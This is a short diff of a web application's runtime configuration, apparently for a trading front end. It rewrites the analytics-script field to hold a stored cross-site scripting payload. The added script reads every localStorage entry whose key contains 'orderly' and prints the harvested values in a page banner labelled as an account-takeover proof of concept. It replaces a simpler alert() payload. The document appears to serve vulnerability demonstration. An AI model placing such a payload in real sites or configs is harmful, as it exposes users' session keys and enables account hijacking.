@@ -27,7 +27,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_TWITTER_URL": "",
   "VITE_SEO_SITE_NAME": "",
   "VITE_SEO_SITE_DESCRIPTION": "",
-  "VITE_SEO_SITE_URL": "https://xss-alert.example.com",
+  "VITE_SEO_SITE_URL": "https://xss-banner.example.com",
   "VITE_SEO_SITE_LANGUAGE": "en",
   "VITE_SEO_SITE_LOCALE": "en_US",
   "VITE_SEO_TWITTER_HANDLE": "",
@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>alert(\"Stored XSS on \"+document.domain)</script>",
+  "VITE_ANALYTICS_SCRIPT": "<script>var s={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);if(k.indexOf(\"orderly\")!==-1)s[k]=localStorage.getItem(k)}var d=document.createElement(\"div\");d.style.cssText=\"background:#111;color:#0f0;padding:15px;font-family:monospace;font-size:12px;white-space:pre-wrap;border-bottom:2px solid red\";d.innerHTML=\"<b style=color:red;font-size:16px>XSS to Account Takeover PoC</b>  |  Domain: \"+document.domain+\"\\n\\nStolen orderly_ keys:\\n\"+JSON.stringify(s,null,2);document.body.insertBefore(d,document.body.firstChild)</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
